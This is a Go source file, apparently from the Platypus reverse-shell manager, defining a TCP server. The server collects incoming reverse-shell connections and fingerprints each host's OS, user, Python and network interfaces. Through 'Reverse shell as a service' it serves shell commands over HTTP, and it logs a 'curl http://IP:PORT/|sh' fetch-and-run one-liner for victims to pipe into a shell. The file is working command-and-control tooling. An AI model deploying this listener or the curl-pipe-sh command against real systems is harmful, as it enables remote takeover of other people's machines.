package context

import (
	"bytes"
	"fmt"
	"net"
	"os"
	"strings"
	"time"

	"github.com/WangYihang/Platypus/lib/util/hash"
	"github.com/WangYihang/Platypus/lib/util/log"
	"github.com/WangYihang/Platypus/lib/util/raas"
	humanize "github.com/dustin/go-humanize"
	"github.com/jedib0t/go-pretty/table"
)

type TCPServer struct {
	Host          string
	GroupDispatch bool
	Port          uint16
	Clients       map[string](*TCPClient)
	TimeStamp     time.Time
	HashFormat    string
	Stopped       chan struct{}
}

func CreateTCPServer(host string, port uint16, hashFormat string) *TCPServer {
	return &TCPServer{
		Host:          host,
		Port:          port,
		GroupDispatch: true,
		Clients:       make(map[string](*TCPClient)),
		TimeStamp:     time.Now(),
		HashFormat:    hashFormat,
		Stopped:       make(chan struct{}, 1),
	}
}

func (s *TCPServer) Hash() string {
	return hash.MD5(fmt.Sprintf("%s:%d:%s", s.Host, s.Port, s.TimeStamp))
}

func (s *TCPServer) Run() {
	service := fmt.Sprintf("%s:%d", s.Host, s.Port)
	tcpAddr, err := net.ResolveTCPAddr("tcp4", service)
	if err != nil {
		log.Error("Resolve TCP address failed: %s", err)
		Ctx.DeleteServer(s)
		return
	}
	listener, err := net.ListenTCP("tcp", tcpAddr)
	if err != nil {
		log.Error("Listen failed: %s", err)
		Ctx.DeleteServer(s)
		return
	}
	log.Info(fmt.Sprintf("Server running at: %s", s.FullDesc()))

	// Add help information of RaaS
	// eg: curl http://[IP]:[PORT]/ | sh
	if net.ParseIP(s.Host).IsUnspecified() {
		// s.Host is unspecified
		// eg: "0.0.0.0", "[::]"
		ifaces, _ := net.Interfaces()
		for _, i := range ifaces {
			addrs, _ := i.Addrs()
			for _, addr := range addrs {
				switch v := addr.(type) {
				case *net.IPNet:
					// ipv4
					if addr.(*net.IPNet).IP.To4() != nil {
						log.Warn("\t`curl http://%s:%d/|sh`", v.IP, s.Port)
						break
					}
					// ipv6 is not used currently
					// log.Warn("\t`curl http://[%s:%d]/|sh`", v.IP, s.Port)
				}
			}
		}
	} else {
		log.Warn("\t`curl http://%s:%d/|sh`", s.Host, s.Port)
	}

	for {
		select {
		case <-s.Stopped:
			listener.Close()
			return
		default:
			var err error
			conn, err := listener.Accept()
			if err != nil {
				continue
			}
			client := CreateTCPClient(conn)
			log.Info("A new income connection from %s", client.Conn.RemoteAddr())
			// Reverse shell as a service
			buffer := make([]byte, 4)
			client.Conn.SetReadDeadline(time.Now().Add(time.Second * 3))
			client.ReadLock.Lock()
			n, err := client.Conn.Read(buffer)
			client.ReadLock.Unlock()
			client.Conn.SetReadDeadline(time.Time{})
			if err != nil {
				if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
					log.Debug("Not requesting for service")
				} else {
					client.Close()
				}
			}
			if string(buffer[:n]) == "GET " {
				requestURI := client.ReadUntilClean(" ")
				// Read HTTP Version
				client.ReadUntilClean("\r\n")
				httpHost := fmt.Sprintf("%s:%d", s.Host, s.Port)
				for {
					var line = client.ReadUntilClean("\r\n")
					// End of headers
					if line == "" {
						log.Debug("All header read")
						break
					}
					delimiter := ":"
					index := strings.Index(line, delimiter)
					headerKey := line[:index]
					headerValue := strings.Trim(line[index+len(delimiter):], " ")
					if headerKey == "Host" {
						httpHost = headerValue
					}
				}
				command := fmt.Sprintf("%s\n", raas.URI2Command(requestURI, httpHost))
				client.Write([]byte("HTTP/1.0 200 OK\r\n"))
				client.Write([]byte(fmt.Sprintf("Content-Length: %d\r\n", len(command))))
				client.Write([]byte("\r\n"))
				client.Write([]byte(command))
				client.Close()
				log.Info("A RaaS request from %s served", client.Conn.RemoteAddr().String())
			} else {
				s.AddTCPClient(client)
			}
		}
	}
}

func (s *TCPServer) AsTable() {
	if len(s.Clients) > 0 {
		t := table.NewWriter()
		t.SetOutputMirror(os.Stdout)
		t.SetTitle(fmt.Sprintf(
			"%s Listening on %s:%d, %d Clients",
			s.Hash(),
			(*s).Host,
			(*s).Port,
			len((*s).Clients),
		))

		t.AppendHeader(table.Row{"Hash", "Network", "OS", "User", "Python", "Time", "GroupDispatch"})

		for chash, client := range s.Clients {
			t.AppendRow([]interface{}{
				chash,
				client.Conn.RemoteAddr().String(),
				client.OS.String(),
				client.User,
				client.Python2 != "" || client.Python3 != "",
				humanize.Time(client.TimeStamp),
				client.GroupDispatch,
			})

		}
		t.Render()
	} else {
		log.Warn(fmt.Sprintf(
			"[%s] listening on %s:%d, 0 clients",
			s.Hash(),
			(*s).Host,
			(*s).Port,
		))
	}
}

func (s *TCPServer) OnelineDesc() string {
	var buffer bytes.Buffer
	buffer.WriteString(
		fmt.Sprintf(
			"%s:%d (%d online clients)",
			s.Host,
			s.Port,
			len(s.Clients),
		),
	)
	return buffer.String()
}

func (s *TCPServer) FullDesc() string {
	var buffer bytes.Buffer
	buffer.WriteString(
		fmt.Sprintf(
			"[%s] %s:%d (%d online clients) (started at: %s)",
			s.Hash(),
			s.Host,
			s.Port,
			len(s.Clients),
			humanize.Time(s.TimeStamp),
		),
	)
	var descs []string
	for _, client := range s.Clients {
		descs = append(descs, fmt.Sprintf("\t%s", client.FullDesc()))
	}
	if len(descs) > 0 {
		buffer.WriteString("\n")
	}
	buffer.WriteString(strings.Join(descs, "\n"))
	return buffer.String()
}

func (s *TCPServer) Stop() {
	log.Info(fmt.Sprintf("Stopping server: %s", s.OnelineDesc()))
	s.Stopped <- struct{}{}

	// Connect to the listener, in order to call listener.Close() immediately
	go func() {
		tmp, _ := net.Dial("tcp", fmt.Sprintf("%s:%d", s.Host, s.Port))
		if tmp != nil {
			tmp.Close()
		}
	}()

	for _, client := range s.Clients {
		s.DeleteTCPClient(client)
	}
}

func (s *TCPServer) AddTCPClient(client *TCPClient) {
	client.GroupDispatch = s.GroupDispatch
	log.Debug("Gathering information from client...")
	client.DetectOS()
	client.DetectUser()
	client.DetectPython()
	client.DetectNetworkInterfaces()
	client.Hash = client.MakeHash(s.HashFormat)
	client.Mature = true
	if _, exists := s.Clients[client.Hash]; exists {
		log.Error("Duplicated income connection detected!")
		client.Close()
	} else {
		log.Success("Fire in the hole: %s", client.OnelineDesc())
		s.Clients[client.Hash] = client
	}
}

func (s *TCPServer) DeleteTCPClient(client *TCPClient) {
	delete(s.Clients, client.Hash)
	client.Close()
}

func (s *TCPServer) GetAllTCPClients() map[string](*TCPClient) {
	return s.Clients
}
